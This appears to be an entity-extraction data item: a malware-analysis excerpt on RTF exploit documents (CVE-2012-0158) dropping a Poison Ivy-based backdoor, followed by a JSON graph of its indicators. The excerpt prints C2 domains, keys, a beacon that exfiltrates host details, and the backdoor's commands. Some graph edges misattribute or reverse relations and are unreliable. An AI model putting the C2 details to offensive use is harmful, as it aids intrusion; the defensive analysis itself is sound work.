@@ -1,0 +1,173 @@
+
+
+
+Sentence : Down the Intelligence Rabbit Hole
+Fighthard.mooo.com additionally resolved to 173.224.214.12 in February of 2014.
+The following exploit documents were identified to contain a payload which communicated to this domain:
+Naval Science Curriculum 2014.doc 8794189aad922f2287a56c5e2405b9fd8affd136286aad7ed893b90cd2b76b9c
+1.doc c593a844a87b3e40346efd5d314c55c5094d5bf191f9bb1aeec8078f6d07c0cd
+Republic Day speech 27 Jan 2014.doc 3219767408bba3fa41b9ab5f964531cf608fb0288684748d6ac0b50cf108c911
+Rampage.freetcp.com still resolves to 103.229.125.157 as of 4/2/2015
+Let's go ahead and take a look further into one of the other expoit documents,
+8794189aad922f2287a56c5e2405b9fd8affd136286aad7ed893b90cd2b76b9c.
+SHA256 8794189aad922f2287a56c5e2405b9fd8affd136286aad7ed893b90cd2b76b9c
+Name Naval Science Curriculum 2014.doc
+File Size 459,087
+The document exploits old faithful, CVE-2012-0158(http://www.cve.mitre.org/cgi-bin/cvename.cgi?
+name=CVE-2012-0158), but instead of using a MIME encoded document this file was just a plain RTX
+document. Yes that's not a misspelling Word is happy to open this RTF format as well. So for anyone
+exploring and hunting RTF documents you may also want to start looking for the "{\rtx" header. We'll skip
+the shellcode analysis for now and go directly to the binary which is stored beginning at offset 0x1BC27 as
+an ASCII hex-encoded, xor-encoded binary. It can be decoded using the XOR key "0xBF". Upon successful
+exploitation the decoded binary will be written first to %TEMP%\dw20.EXE then copied to
+%WINDIR%\msascm32.drv. No other changes are made to the system.
+File Details
+Full File Path: %WINDIR%\msacm32.drv
+SHA256: 67bd81f4c5e129d19ae71077be8b68dc60e16c19019b2c64cdcedca1f43f0ae3
+File Size: 108,544 Bytes
+Compile Time: 9/26/2013 01:46:23 UTC
+I'm always curious when no registry changes are made in the exploitation process. At first the backdoor
+failed to load or really do anything in my VM until I read what the "msascm32.drv" file does. Looking at the
+original file's (%WINDIR%\system32\msacm32.drv) imported functions, it's clear the DLL is responsible for
+some type of audio processing and/or playback. A quick search on the internet confirmed this so I added a
+soundcard to my VM.
+On reboot explorer.exe was now happy to load the backdoor and get down to business; this technique is
+known as dll search order hijacking or binary planting. Interestingly the backdoor will also load the legitimate
+system32\msacm32.drv file resolve functions and pass calls to it so it doesn't break audio playback on the
+victim system. The backdoor contains identical exports as well as an additional dummy function from the
+legitimate msacm32.drv called "StartWork" which can be used to reliably identify similar samples. The
+backdoor routine exists inside the DllMain function so when explorer.exe loads the backdoor via
+LoadLibrary it will begin spawning malicious threads.
+A PDB path was also left in this binary C:\Users\cmd\Desktop\msacm32\Release\msacm32.pdb; A quick
+google search will lead you to a YARA rule written by Patrick Olsen and the very similar sample
+869fa4dfdbabfabe87d334f85ddda234 which communicates to www.micro1.zyns.com on TCP port 80. The
+two files also have an identical compilation time, which suggests the backdoor is probably not recompiled
+very often and instead the attacker simply updates the callback configuration information.
+The backdoor interestingly contains the well known Poison Ivy RAT shellcode as well as its own custom
+backdoor. It will first attempt to communicate to fighthard.mooo.com using the poison ivy binary protocol
+with the default connection password of "admin". The Poison Ivy shellcode is encrypted using a custom
+cipher with the key "Tiger324{" beginning at offset 0xFA5 and ending at 0x159E. If this initial connection fails
+it will revert to the secondary backdoor, which utilizes HTTP GET and POST requests somewhat similar to the
+ones described above to the internal IP address "192.168.2.26". This suggested the attacker had already
+compromised other systems in the environment and was using an internal C2 mechanism for a fallback.
+Example Internal Beacon:
+GET /login.asp?
+phWe8J5pFk5xv5XeUhIJbKZQfySZRv1NcwhQi2ZHKKvGBC8EjiadbWLoUcgUxJyZElD7AY0DCWmzbIa9IX
+EJ7OZkvwBZVx1JsrhQ== HTTP/1.1
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 192.168.2.26
+Requests may also be made to the following pages: "check.asp", "result.asp", and "upload.asp". The request
+structure is slightly different in that it uses the base64 alphabet
+"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+*". The resulting request can
+be decoded further by using the first 16 bytes of the result as an XOR key to decode the rest of the payload.
+It also uses a static User-Agent string of "Mozilla/4.0 (compatible; MSIE 8.0; Win32)" for each request.
+The following script simplifies this process:
+def rolling_xor(buf, key):
+out = ''
+k = 0
+for i in buf:
+if k == len(key):
+k = 0
+out += chr(ord(i) ^ ord(key[k]))
+k += 1
+return out
+req =
+'phWe8J5pFk5xv5XeUhIJbKZQfySZRv1NcwhQi2ZHKKvGBC8EjiadbWLoUcgUxJyZElD7AY0DCWmzbIa9I
+XEJ7OZkvwBZVx1JsrhQ=='
+unb64 = base64.b64decode(req,'+*')
+dec = rolling_xor(unb64[16::],unb64[0:16])
+print dec
+The request decodes to "123|000000+|USER-D6921F6215|Administrator|-1676096002|1.0|0|", where
+values are separated by the delimiter "|". "123" is a campaign identifier hard coded into the backdoor. I
+don't know what "000000+" is but it's also a hard coded value; my best guess is it's to modify the timezone of
+the timestamp. "USER-D6921F6215" is the hostname of the victim, "Administrator" is the victim user,
+"1676096002" is the current Date/Time in decimal, and "1.0" is a version number also stored in the
+backdoor.The 16-byte XOR key will be randomly generated per each request. Results from commands will
+be sent back encoded to the server to the "result.asp" page.
+The backdoor will accept the following commands:
+#runhfcore- starts the main PI backdoor functionality in a separate thread
+getdrivelist? - enumerates logical drives on the system
+getfilelist? - enumerates logical files using FindFirst FindNext technique
+delfile- deletes a file using the DeleteFileA API
+newupload? - uploads a file
+newdownload? - downloads a file
+runfile- - executes a file on the system via CreateProcess API
+urldownload? - will download a file from a remote URL using InternetOpen and InternetReadFile
+sleep? - Sleeps for a specified number of minutes
+delay? - exact functionality unknown appears to force another request to the C2 page check.asp
+maxblock? - exact functionality unknown appears to force another request to the C2 page
+check.asp
+stop! - exact functionality unknown appears to force another request to the C2 page check.asp
+Commands with a ? appear to take an additional parameter while files that end in - require a full file path.
+The backdoor is also capable of elevating its privileges on win7 and above using a method similar to the one
+described here: http://www.pretentiousname.com/misc/win7_uac_whitelist2.html. I thought it was
+interesting the backdoor used a secondary backup backdoor in addition to its primary payload.
+The first communicated directly outside the network using a well known RAT protocol and if that failed the
+secondary much stealthier backdoor communicated to an internal C2 address using it's own custom
+encoded HTTP based protocol. The use of a relatively undisclosed DLL search order hijack also made this
+sample unique. Detection rates for this binary seem to be pretty good right now 39/57; however, at the time
+it was first used in late January 2014 detection rates were much poorer. Other samples from the identified
+exploit documents were similar to the one described above with different network callbacks.
+And now to tie all this back to the "well-known" threat group. The "173.224.214.12" IP address that
+"fighthard.mooo.com" previously resolved to also historically had two other domains point to it
+"queenberry.www1.biz" and "word.crabdance.com". "word.crabdance.com" previously resolved to
+"64.71.162.70" on September 8, 2012 and 108.171.246.140 on February 19, 2014. The "64.71.162.70"
+address and the associated domain "www.ollay011.zyns.com" are rather infamous and the first mention of it
+I could find is in this shadowserver post: http://blog.shadowserver.org/2012/04/16/beware-of-what-you
+download-recent-purported-ceiec-document-dump-booby-trapped/ related to exploit documents identified
+in a data dump from Hardcore Charlie. If you follow the rabbit hole deep enough you can eventually trace
+samples via domain and IP address crossover back to the FBI flash #A-000009-MW from mid 2013.
+Additional domains and IP addresses related to this group are included in the appendix.
+Output : 
+{
+    "nodes": [
+        {"id": 1, "description": "fighthard.mooo.com", "type": "CCSH"},
+        {"id": 2, "description": "173.224.214.12", "type": "CCSH"},
+        {"id": 3, "description": "Naval Science Curriculum 2014.doc", "type": "DOCF"},
+        {"id": 4, "description": "8794189aad922f2287a56c5e2405b9fd8affd136286aad7ed893b90cd2b76b9c", "type": "IOCS"},
+        {"id": 5, "description": "1.doc", "type": "DOCF"},
+        {"id": 6, "description": "c593a844a87b3e40346efd5d314c55c5094d5bf191f9bb1aeec8078f6d07c0cd", "type": "IOCS"},
+        {"id": 7, "description": "Republic Day speech 27 Jan 2014.doc", "type": "DOCF"},
+        {"id": 8, "description": "3219767408bba3fa41b9ab5f964531cf608fb0288684748d6ac0b50cf108c911", "type": "IOCS"},
+        {"id": 9, "description": "rampage.freetcp.com", "type": "CCSH"},
+        {"id": 10, "description": "103.229.125.157", "type": "CCSH"},
+        {"id": 11, "description": "CVE-2012-0158", "type": "CVES"},
+        {"id": 12, "description": "%TEMP%\\dw20.EXE", "type": "SYSP"},
+        {"id": 13, "description": "%WINDIR%\\msascm32.drv", "type": "SYSP"},
+        {"id": 14, "description": "67bd81f4c5e129d19ae71077be8b68dc60e16c19019b2c64cdcedca1f43f0ae3", "type": "IOCS"},
+        {"id": 15, "description": "www.micro1.zyns.com", "type": "CCSH"},
+        {"id": 16, "description": "192.168.2.26", "type": "CCSH"},
+        {"id": 17, "description": "Poison Ivy RAT", "type": "APPS"},
+        {"id": 18, "description": "HTTP GET and POST requests", "type": "NETP"},
+        {"id": 19, "description": "C:\\Users\\cmd\\Desktop\\msacm32\\Release\\msacm32.pdb", "type": "SYSP"},
+        {"id": 20, "description": "queenberry.www1.biz", "type": "CCSH"},
+        {"id": 21, "description": "word.crabdance.com", "type": "CCSH"},
+        {"id": 22, "description": "64.71.162.70", "type": "CCSH"},
+        {"id": 23, "description": "www.ollay011.zyns.com", "type": "CCSH"},
+        {"id": 24, "description": "108.171.246.140", "type": "CCSH"},
+        {"id": 25, "description": "FBI flash #A-000009-MW", "type": "DOC"}
+    ],
+    "edges": [
+        {"source": 1, "target": 2, "rel_name": "resolves to"},
+        {"source": 3, "target": 4, "rel_name": "contains hash"},
+        {"source": 5, "target": 6, "rel_name": "contains hash"},
+        {"source": 7, "target": 8, "rel_name": "contains hash"},
+        {"source": 9, "target": 10, "rel_name": "resolves to"},
+        {"source": 3, "target": 1, "rel_name": "communicates with"},
+        {"source": 5, "target": 1, "rel_name": "communicates with"},
+        {"source": 7, "target": 1, "rel_name": "communicates with"},
+        {"source": 3, "target": 11, "rel_name": "exploits"},
+        {"source": 12, "target": 13, "rel_name": "copied to"},
+        {"source": 13, "target": 14, "rel_name": "contains hash"},
+        {"source": 13, "target": 15, "rel_name": "communicates with"},
+        {"source": 13, "target": 16, "rel_name": "communicates with"},
+        {"source": 13, "target": 17, "rel_name": "contains"},
+        {"source": 13, "target": 18, "rel_name": "uses"},
+        {"source": 19, "target": 13, "rel_name": "related to"},
+        {"source": 2, "target": 20, "rel_name": "historically pointed to"},
+        {"source": 2, "target": 21, "rel_name": "historically pointed to"},
+        {"source": 21, "target": 22, "rel_name": "previously resolved to"},
+        {"source": 21, "target": 24, "rel_name": "previously resolved to"},
+        {"source": 22, "target": 23, "rel_name": "related to"}
+    ]
+}
